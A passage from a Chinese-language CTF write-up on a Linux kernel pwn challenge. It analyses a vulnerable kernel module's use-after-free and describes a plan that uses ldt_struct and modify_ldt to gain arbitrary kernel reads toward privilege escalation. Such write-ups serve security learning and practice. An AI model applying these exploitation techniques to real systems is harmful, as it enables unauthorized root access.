class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo mount rootfs.img /mnt/temp</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/26/iRaDAoUKVOeQ1r7.png" alt="image.png"></p><p>本地调试时直接将文件复制到挂载点下即可，在 <code>umount</code> 之后修改会自动生效</p><h3 id="保护-1"><a href="#保护-1" class="headerlink" title="保护"></a>保护</h3><p>我们首先查看题目提供的 <code>README.md</code>：</p><blockquote><p>Here are some kernel config options in case you need it</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_SLAB=y</span><br><span class="line">CONFIG_SLAB_FREELIST_RANDOM=y</span><br><span class="line">CONFIG_SLAB_FREELIST_HARDENED=y</span><br><span class="line">CONFIG_HARDENED_USERCOPY=y</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER=y</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER_PATH=&quot;&quot;</span><br></pre></td></tr></table></figure></blockquote><p>我们可以看到的是出题人在编译内核时并没有选择默认的 slub 分配器，而是选择了 <code>slab</code> 分配器，后续我们解题的过程也与 slab 的特征有关</p><ul><li>开启了 Random Freelist（slab 的 freelist 会进行一定的随机化）</li><li>开启了 Hardened Freelist（slab 的 freelist 中的 object 的 next 指针会与一个 cookie 进行异或（参照 glibc 的 safe-linking））</li><li>开启了 Hardened Usercopy（在向内核拷贝数据时会进行检查，检查<strong>地址是否存在、是否在堆栈中、是否为 slab 中 object、是否非内核 .text 段内地址等等</strong>）</li><li>开启了 Static Usermodehelper Path（modprobe_path 为只读，不可修改）</li></ul><p>接下来分析启动脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 128M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-hda ./rootfs.img \</span><br><span class="line">-append <span class="string">&quot;console=ttyS0 quiet root=/dev/sda rw init=/init oops=panic panic=1 panic_on_warn=1 kaslr pti=on&quot;</span> \</span><br><span class="line">-monitor /dev/null \</span><br><span class="line">-smp cores=2,threads=2 \</span><br><span class="line">-nographic \</span><br><span class="line">-cpu kvm64,+smep,+smap \</span><br><span class="line">-no-reboot \</span><br><span class="line">-snapshot \</span><br><span class="line">-s</span><br></pre></td></tr></table></figure><ul><li>开启了 SMAP &amp; SMEP（用户空间数据访问（access）、执行（execute）保护）</li><li>开启了 KASLR（内核地址空间随机化）</li><li>开启了 KPTI（内核页表隔离）</li></ul><h3 id="逆向分析-1"><a href="#逆向分析-1" class="headerlink" title="逆向分析"></a>逆向分析</h3><p>题目给出了一个内核模块 <code>kernote.ko</code>，按惯例这便是存在漏洞的内核模块</p><p>拖入 IDA 进行分析，不能看出是常见的内核菜单堆形式，只定义了 ioctl且加了🔒</p><h4 id="0x6667-分配-object"><a href="#0x6667-分配-object" class="headerlink" title="0x6667. 分配 object"></a>0x6667. 分配 object</h4><p>0x6667 功能可以分配 object，在这里存在一个全局指针数组 buf 用以存放 object 指针，我们最多可以同时存放 0xF 个 object 指针，而分配的大小限定为 0x8</p><p><img src="https://i.loli.net/2021/10/27/rMzk1F8OsVdXeZW.png" alt="image.png"></p><p>在这里有一个 slab 与 slub 相不同的点：对于以往的 slub 分配器而言，若是我们 kmalloc(8) 则通常会从 <code>kmalloc-8</code> 中取大小为 8 的 object；但是在 slab 源码中有如下定义：</p><blockquote><p>内核源码版本5.11，include&#x2F;linux&#x2F;slab.h</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The largest kmalloc size supported by the SLAB allocators is</span></span><br><span class="line"><span class="comment"> * 32 megabyte (2^25) or the maximum allocatable page order if that is</span></span><br><span class="line"><span class="comment"> * less than 32 MB.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * WARNING: Its not easy to increase this value since the allocators have</span></span><br><span class="line"><span class="comment"> * to do various tricks to work around compiler limitations in order to</span></span><br><span class="line"><span class="comment"> * ensure proper constant folding.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_SHIFT_HIGH    ((MAX_ORDER + PAGE_SHIFT - 1) &lt;= 25 ? \</span></span><br><span class="line"><span class="meta">                (MAX_ORDER + PAGE_SHIFT - 1) : 25)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_SHIFT_MAX    KMALLOC_SHIFT_HIGH</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> KMALLOC_SHIFT_LOW</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_SHIFT_LOW    5</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Kmalloc subsystem.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> KMALLOC_MIN_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_MIN_SIZE (1 &lt;&lt; KMALLOC_SHIFT_LOW)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>即 slab 分配器分配的 object 的大小<strong>最小为 32</strong>，那么我们应当是从 <code>kmalloc-32</code> 中取 object</p><blockquote><p>阅读源码我们可以发现 slab 为 32， 而 slob 和 slub 都是 8</p></blockquote><h4 id="0x6666-保存-object-指针到全局变量-note"><a href="#0x6666-保存-object-指针到全局变量-note" class="headerlink" title="0x6666. 保存 object 指针到全局变量 note"></a>0x6666. 保存 object 指针到全局变量 note</h4><p>这个功能将 buf 数组中指定 object 指针存放到全局变量 note 中，我们不难想到这里<strong>可能会有 UAF</strong>，后续分析我们可以发现确实如此</p><p><img src="https://i.loli.net/2021/10/27/NudsLpgC7yZE45h.png" alt="image.png"></p><h4 id="0x6668-释放指定-object"><a href="#0x6668-释放指定-object" class="headerlink" title="0x6668. 释放指定 object"></a>0x6668. 释放指定 object</h4><p>比较纯粹的 free 功能，注意到这里是释放的 buf 数组内 object 后清空，<strong>但是没有清空 note 数组</strong>，一个 UAF 已经呼之欲出了</p><p><img src="https://i.loli.net/2021/10/27/kPEM6tCymF1HiO5.png" alt="image.png"></p><h4 id="0x6669-向-note-指向-object-内写入-8-字节"><a href="#0x6669-向-note-指向-object-内写入-8-字节" class="headerlink" title="0x6669. 向 note 指向 object 内写入 8 字节"></a>0x6669. 向 note 指向 object 内写入 8 字节</h4><p>UAF 已经贴脸了（）</p><p><img src="https://i.loli.net/2021/10/27/rFMhKICwqvjlemY.png" alt="image.png"></p><h4 id="0x666A-打印-note-所存-object-地址（无效功能）"><a href="#0x666A-打印-note-所存-object-地址（无效功能）" class="headerlink" title="0x666A. 打印 note 所存 object 地址（无效功能）"></a>0x666A. 打印 note 所存 object 地址（无效功能）</h4><p>比赛的时候分析得比较痛苦的一个功能…赛后出题人说这个功能写来玩的（🔨）</p><p>一开始首先从一个奇怪的地方取了一个值，<del>虽然赛后看出题人写的源代码不是这个样子，但众所周知内核的很多宏展开及多层结构体套娃给逆向工作带来极大困难</del></p><p><img src="https://i.loli.net/2021/10/27/DT9OfQBsFG2iHtE.png" alt="image.png"></p><p>笔者在比赛期间猜测应当是 <code>current_task-&gt;cred</code> 中某个值，后面找了对应内核版本源码自己写了个内核模块瞎猜偏移，最后试出来是<code>current_task-&gt;cred-&gt;user-&gt;__count</code></p><p>前面这一段代码首先给 <code>current_task-&gt;cred-&gt;user</code> 的引用计数器 <code>__count</code> 成员 + 1，对应内核函数 <code>refcount_inc()</code> ，多层套娃调用展开后如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> __refcount_add(<span class="type">int</span> i, <span class="type">refcount_t</span> *r, <span class="type">int</span> *oldp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> old = atomic_fetch_add_relaxed(i, &amp;r-&gt;refs);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (oldp)</span><br><span class="line">        *oldp = old;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unlikely(!old))</span><br><span class="line">        refcount_warn_saturate(r, REFCOUNT_ADD_UAF);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (unlikely(old &lt; <span class="number">0</span> || old + i &lt; <span class="number">0</span>))</span><br><span class="line">        refcount_warn_saturate(r, REFCOUNT_ADD_OVF);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么这段代码就不难理解了（<del>不用理解了</del>），v6 指向<code>current_task-&gt;cred-&gt;user-&gt;__count</code>，而 <code>__count</code> 是 user_struct 结构体的第一个成员，也就是 v6 指向 <code>current_task-&gt;cred-&gt;user</code></p><blockquote><p>赛后看出题人给的源码，这一段代码其实就只是一个 <code>get_current_user()</code></p></blockquote><p>那么下面的代码我们很容易看出是检测 <code>current_task-&gt;cred-&gt;user-&gt;uid-&gt;val</code>（uid 里面就封装了一个 val） 是否为0 ，若为 0 也就是 root 才会进入到 kernote_ioctl_cold 中</p><p><img src="https://i.loli.net/2021/10/27/VzDEscud1xeKiP5.png" alt="image.png"></p><p>最终 kernote_ioctl_cold 会打印 note 中存的 object 的地址，<strong>但是我们一开始肯定不是 root 所以这个功能没有任何意义</strong></p><p><img src="https://i.loli.net/2021/10/27/fzorATm3OpHydl9.png" alt="image.png"></p><blockquote><p>这个功能当时还差点让笔者分析错方向，我们前面已经有了一个 UAF，但在此处调用 get_current_user() 时 user 的引用计数器（user-&gt;__count）自动 + 1，而在结束时并没有让引用计数器自减 1（没有“释放”掉引用），这本身也算是一个 bug，但实质上与解题是无关的 bug</p><blockquote><p>当然，这个 bug 也没法帮助我们完成提权</p></blockquote><p>因而官方当时发了这样一个公告：</p><p><img src="https://i.loli.net/2021/10/29/KYq9ACw7eZhFXPv.png" alt="image.png"></p><p>由于笔者的英文水平自从上了大学之后便几乎没有长进，在笔者看来——<code>release</code> 指的应该就是 <code>free</code>，也就是说指的是前面的垂悬指针并不是题目的考察点（那这还怎么解题啊），于是有了如下对话：</p><p><img src="https://i.loli.net/2021/10/29/uyaowMvQY4INV32.png" alt="image.png"></p><p><del>虽然最后直到比赛结束笔者也没解出这道题</del></p></blockquote><h2 id="二、漏洞利用-1"><a href="#二、漏洞利用-1" class="headerlink" title="二、漏洞利用"></a>二、漏洞利用</h2><p>那么我们现在只有一个 UAF，而且只能写 8 字节，没法直接泄露内核相关数据，分配的 object 大小限制为 32，这无疑为我们的解题增添了一定难度</p><h3 id="ldt-struct-结构体"><a href="#ldt-struct-结构体" class="headerlink" title="ldt_struct 结构体"></a>ldt_struct 结构体</h3><p>笔者参照官方题解选择使用 <code>ldt_struct</code> 这个内核结构体进行进一步利用，这里先简单讲一下这是个什么东西：</p><p>ldt 即<strong>局部段描述符表</strong>（<strong>Local Descriptor Table</strong>），其中存放着<strong>进程的</strong>段描述符，段寄存器当中存放着的段选择子便是段描述符表中段描述符的索引</p><p>该结构体定义于内核源码 <code>arch/x86/include/asm/mmu_context.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> &#123;</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Xen requires page-aligned LDTs with special permissions.  This is</span></span><br><span class="line"><span class="comment">     * needed to prevent us from installing evil descriptors such as</span></span><br><span class="line"><span class="comment">     * call gates.  On native, we could merge the ldt_struct and LDT</span></span><br><span class="line"><span class="comment">     * allocations, but it&#x27;s not worth trying to optimize.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span>    *<span class="title">entries</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        nr_entries;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * If PTI is in use, then the entries array is not mapped while we&#x27;re</span></span><br><span class="line"><span class="comment">     * in user mode.  The whole array will be aliased at the addressed</span></span><br><span class="line"><span class="comment">     * given by ldt_slot_va(slot).  We use two slots so that we can allocate</span></span><br><span class="line"><span class="comment">     * and map, and enable a new LDT without invalidating the mapping</span></span><br><span class="line"><span class="comment">     * of an older, still-in-use LDT.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * slot will be -1 if this LDT doesn&#x27;t have an alias mapping.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span>            slot;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>该结构体大小仅为 0x10，在分配时 slab 分配器毫无疑问会从 kmalloc-32 中取，且我们可控的其前八个字节又刚好是一个指针，为我们后续的利用提供了一定的便利性</p><h4 id="desc-struct-结构体"><a href="#desc-struct-结构体" class="headerlink" title="desc_struct 结构体"></a>desc_struct 结构体</h4><p>我们所能控制的 entries 指针为 <code>desc_struct</code> 结构体，即<strong>段描述符</strong>，定义于 <code>/arch/x86/include/asm/desc_defs.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 8 byte segment descriptor */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> &#123;</span></span><br><span class="line">    u16    limit0;</span><br><span class="line">    u16    base0;</span><br><span class="line">    u16    base1: <span class="number">8</span>, type: <span class="number">4</span>, s: <span class="number">1</span>, dpl: <span class="number">2</span>, p: <span class="number">1</span>;</span><br><span class="line">    u16    limit1: <span class="number">4</span>, avl: <span class="number">1</span>, l: <span class="number">1</span>, d: <span class="number">1</span>, g: <span class="number">1</span>, base2: <span class="number">8</span>;</span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure><h5 id="低-32-位"><a href="#低-32-位" class="headerlink" title="低 32 位"></a>低 32 位</h5><table><thead><tr><th align="center">31~16</th><th align="center">15~0</th></tr></thead><tbody><tr><td align="center">段基址的 15~0 位</td><td align="center">段界限的 15~0 位</td></tr></tbody></table><p>段基址 32 位，段界限为 20 位，其所能够表示的地址范围为：</p><p><code>段基址 + （段粒度大小 x （段界限+1）） - 1</code></p><h5 id="高-32-位"><a href="#高-32-位" class="headerlink" title="高 32 位"></a>高 32 位</h5><table><thead><tr><th align="center">31~24</th><th align="center">23</th><th align="center">22</th><th align="center">21</th><th align="center">20</th><th align="center">19~16</th><th align="center">15</th><th align="center">14~13</th><th align="center">12</th><th align="center">11~8</th><th align="center">7~0</th></tr></thead><tbody><tr><td align="center">段基址的 31~24 位</td><td align="center">G</td><td align="center">D&#x2F;B</td><td align="center">L</td><td align="center">AVL</td><td align="center">段界限的 19 ~16 位</td><td align="center">P</td><td align="center">DPL</td><td align="center">S</td><td align="center">TYPE</td><td align="center">段基址的 23~16 位</td></tr></tbody></table><p>各参数便不在此赘叙了，具其构造可以参见<a href="https://arttnba3.cn/2021/06/24/CODE-0X00-A3OS/#%E4%B8%89%E3%80%81%E5%85%A8%E5%B1%80%E6%8F%8F%E8%BF%B0%E7%AC%A6%E8%A1%A8%EF%BC%88Global-Descriptor-Table%EF%BC%89">全局描述符表（Global Descriptor Table） - arttnba3.cn</a></p><h3 id="modify-ldt-系统调用"><a href="#modify-ldt-系统调用" class="headerlink" title="modify_ldt 系统调用"></a>modify_ldt 系统调用</h3><p>Linux 提供给我们一个叫 <code>modify_ldt</code> 的系统调用，通过该系统调用我们可以<strong>获取或修改当前进程的 LDT</strong></p><p>我们来看一下在内核中这个系统调用是如何操纵 ldt 的，该系统调用定义于 <code>/arch/x86/kernel/ldt.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(modify_ldt, <span class="type">int</span> , func , <span class="type">void</span> __user * , ptr ,</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> , bytecount)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> ret = -ENOSYS;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (func) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        ret = read_ldt(ptr, bytecount);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        ret = write_ldt(ptr, bytecount, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        ret = read_default_ldt(ptr, bytecount);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x11</span>:</span><br><span class="line">        ret = write_ldt(ptr, bytecount, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * The SYSCALL_DEFINE() macros give us an &#x27;unsigned long&#x27;</span></span><br><span class="line"><span class="comment">     * return type, but tht ABI for sys_modify_ldt() expects</span></span><br><span class="line"><span class="comment">     * &#x27;int&#x27;.  This cast gives us an int-sized value in %rax</span></span><br><span class="line"><span class="comment">     * for the return code.  The &#x27;unsigned&#x27; is necessary so</span></span><br><span class="line"><span class="comment">     * the compiler does not try to sign-extend the negative</span></span><br><span class="line"><span class="comment">     * return codes into the high half of the register when</span></span><br><span class="line"><span class="comment">     * taking the value from int-&gt;long.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们应当传入三个参数：func、ptr、bytecount，其中 ptr 应为指向 <code>user_desc</code> 结构体的指针，参照 man page 可知该结构体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>  entry_number;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>  base_addr;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>  limit;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>  seg_32bit:<span class="number">1</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>  contents:<span class="number">2</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>  read_exec_only:<span class="number">1</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>  limit_in_pages:<span class="number">1</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>  seg_not_present:<span class="number">1</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>  useable:<span class="number">1</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="read-ldt-：内核任意地址读"><a href="#read-ldt-：内核任意地址读" class="headerlink" title="read_ldt()：内核任意地址读"></a>read_ldt()：内核任意地址读</h4><p>定义于 <code>/arch/x86/kernel/ldt.c</code>中，我们主要关注如下逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">read_ldt</span><span class="params">(<span class="type">void</span> __user *ptr, <span class="type">unsigned</span> <span class="type">long</span> bytecount)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    <span class="keyword">if</span> (copy_to_user(ptr, mm-&gt;context.ldt-&gt;entries, entries_size)) &#123;</span><br><span class="line">        retval = -EFAULT;</span><br><span class="line">        <span class="keyword">goto</span> out_unlock;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">out_unlock:</span><br><span class="line">    up_read(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里会<strong>直接调用 copy_to_user 向用户地址空间拷贝数据</strong>，我们不难想到的是若是能够控制 ldt-&gt;entries 便能够完成内核的任意地址读，由此泄露出内核数据</p><h4 id="write-ldt-：分配新的-ldt-struct-结构体"><a href="#write-ldt-：分配新的-ldt-struct-结构体" class="headerlink" title="write_ldt()：分配新的 ldt_struct 结构体"></a>write_ldt()：分配新的 ldt_struct 结构体</h4><p>定义于 <code>/arch/x86/kernel/ldt.c</code>中，我们主要关注如下逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">write_ldt</span><span class="params">(<span class="type">void</span> __user *ptr, <span class="type">unsigned</span> <span class="type">long</span> bytecount, <span class="type">int</span> oldmode)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    error = -EINVAL;</span><br><span class="line">    <span class="keyword">if</span> (bytecount != <span class="keyword">sizeof</span>(ldt_info))</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    error = -EFAULT;</span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(&amp;ldt_info, ptr, <span class="keyword">sizeof</span>(ldt_info)))</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">    error = -EINVAL;</span><br><span class="line">    <span class="keyword">if</span> (ldt_info.entry_number &gt;= LDT_ENTRIES)</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    old_ldt       = mm-&gt;context.ldt;</span><br><span class="line">    old_nr_entries = old_ldt ? old_ldt-&gt;nr_entries : <span class="number">0</span>;</span><br><span class="line">    new_nr_entries = max(ldt_info.entry_number + <span class="number">1</span>, old_nr_entries);</span><br><span class="line"></span><br><span class="line">    error = -ENOMEM;</span><br><span class="line">    new_ldt = alloc_ldt_struct(new_nr_entries);</span><br><span class="line">    <span class="keyword">if</span> (!new_ldt)</span><br><span class="line">        <span class="keyword">goto</span> out_unlock;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (old_ldt)</span><br><span class="line">        <span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_ldt-&gt;entries, old_nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line">    new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    install_ldt(mm, new_ldt);</span><br><span class="line">    unmap_ldt_struct(mm, old_ldt);</span><br><span class="line">    free_ldt_struct(old_ldt);</span><br><span class="line">    error = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">out_unlock:</span><br><span class="line">    up_write(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line">out:</span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们注意到在 write_ldt() 当中会使用 alloc_ldt_struct() 函数来为新的 ldt_struct 分配空间，随后将之应用到进程， alloc_ldt_struct() 函数定义于 <code>arch/x86/kernel/ldt.c</code> 中，我们主要关注如下逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The caller must call finalize_ldt_struct on the result. LDT starts zeroed. */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> ldt_struct *<span class="title function_">alloc_ldt_struct</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> num_entries)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> *<span class="title">new_ldt</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> alloc_size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (num_entries &gt; LDT_ENTRIES)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    new_ldt = kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ldt_struct), GFP_KERNEL);</span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>可以看到的是，ldt_struct 结构体通过 kmalloc() 从 <code>kmalloc-xx</code> 中取，对于 slab 分配器即为从 <code>kmalloc-32</code> 中取，由此我们可以得到如下解题思路：</p><ul><li>先分配一个 object 后释放</li><li>通过 write_ldt() 将这个 object 重新取回</li><li>通过 UAF 更改 ldt-&gt;entries</li><li>通过 read_ldt() 搜索内核地址空间</li></ul><p>接下来我们考虑如何完成提权</p><h3 id="解法一：遍历内存修改进程-cred-提权（官方解法）"><a href="#解法一：遍历内存修改进程-cred-提权（官方解法）" class="headerlink" title="解法一：遍历内存修改进程 cred 提权（官方解法）"></a>解法一：遍历内存修改进程 cred 